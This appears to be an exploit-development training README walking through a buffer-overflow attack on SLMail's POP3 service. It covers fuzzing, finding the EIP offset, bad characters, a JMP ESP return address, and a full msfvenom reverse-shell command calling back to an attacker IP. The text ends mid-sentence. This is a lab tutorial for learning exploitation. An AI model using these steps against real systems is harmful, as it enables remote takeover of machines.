# ExpDev

* Identify the vuln port (netstat -noa on target // nmap the target).
* Attach the procces to Immunity debugger and "Play" it on the target.
* Edit Fuzzer.py (IP address, port and what it sends in the socket - Ex. sLmail_pop3_pass_fuzzer.py in repo).
* Fuzz the target.
* Write a POC that replicates the crash (Ex. slmail_pop3_replicated_crash.py in repo).
* Locate those 4 A's that overwrite the EIP register.
* Send a unique string in order to identify the EIP offset. The size of this string is equal to the amount of bytes that crash the service. Use pattern_create in kali (Ex. pattern_create.rb -l 2700 --> place the output in buffer variable. See  	slmail_pop3_pattern_create.py in repo).
* Use pattern_offset.rb to discover the offset of these specific 4 bytes in the unique byte string and edit buffer variable (Ex. pattern_offset.rb -l 2700 -q 39694438. See slmail_pop3_pattern_offset.py
in repo).
* Locate space for the shellcode - a standart reverse shell payload requires about 350-400 bytes of space. Locate a convenient location to place the shellcode using the crash in Immunity debugger (Ex. C's in slmail crash are 90 bytes. You can increase the buffer length in order to make the shellcode fit. Ex. Increased buffer in slmail from 2700 to 3500. See slmail_pop3_locate_space.py in repo).
* Check for bad characters - an easy way to do this is to send all possible chars, from 0x00 to 0xff, as part of the buffer variable. See how these chars are dealt with by the app in memory dump of ESP register (Follow in dump - 01 02 03 etc..), after the crash (Ex. 0x00 - null byte is always bad. See slmail_pop3_bad_chars.py).
* Run the badchars check again and again till it doesnt trancate the values in memory (delete the relevnt chars before running the check in buffer, of course).
* Find a return address - using Mona.py in the Immunity debugger you should look for module that is not protected by DEP/ASLR and has a memory range that does not cotain bad characters.
Run "!mona modules" in Immunity to find one.
Run nasm_shell.rb in kali in order to find an opcode that is equivilent to JMP ESP command.
Search for this opcode in all sections of the .dll file that found in modules by this command in Immunity:
"!mona find -s "<OPCODE_IN_HEXA>" (Ex.\xff\xe4) -m <.DLL_FILE> (Ex. slmfc.dll)".
Choose one that doesnt contain bad chars (double check that inside the debugger - Ex. address like 0x5f4a358f).
* Edit the exploit and add this address instead of EIP (B's) place (See slmail_pop3_return_address.py in repo)
* Place a breakpoint in this address and check it actually reaches it.
* Generate a shellcode using MSFVENOM (msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKERS_IP> LPORT=<ATTACKERS_PORT> -f c -a x86 --platform windows -e x86/shikata_ga_nai -b "<BAD_CHARS>" (ex. "\x00\x0a\x0d")).
* Place this shellcode in the exploit POC (See 
